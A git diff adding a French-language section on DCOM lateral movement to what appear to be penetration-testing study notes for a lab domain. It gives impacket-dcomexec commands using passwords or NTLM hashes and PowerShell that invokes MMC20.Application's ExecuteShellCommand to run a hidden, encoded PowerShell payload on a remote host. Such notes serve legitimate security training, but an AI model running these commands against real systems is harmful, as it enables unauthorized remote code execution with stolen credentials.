@@ -223,3 +223,32 @@ klist
 ls \\web04\backup
 ```
 
+## DCOM
+
+Exécution distante via les objets COM/DCOM. Utilise RPC sur le port **135**. Nécessite admin local sur la cible.
+
+Objet utilisé : **MMC20.Application** → méthode `Document.ActiveView.ExecuteShellCommand`
+
+**Kali (impacket-dcomexec)**
+
+```bash
+# Par défaut : ShellWindows (nécessite explorer.exe actif → échoue sur les serveurs sans session interactive)
+# Préférer MMC20 qui tourne en Session 0 (indépendant des sessions utilisateur)
+impacket-dcomexec -object MMC20 corp.com/<user>:<password>@<IP_CIBLE>
+impacket-dcomexec -object ShellWindows corp.com/<user>:<password>@<IP_CIBLE>
+impacket-dcomexec -object ShellBrowserWindow corp.com/<user>:<password>@<IP_CIBLE>
+
+# Avec hash NTLM
+impacket-dcomexec -hashes :<NTLM_HASH> corp.com/<user>@<IP_CIBLE>
+```
+
+**Windows (PowerShell)**
+
+```powershell
+# Instancier l'objet MMC distant
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_CIBLE>"))
+
+# Exécuter une commande
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
+```
+
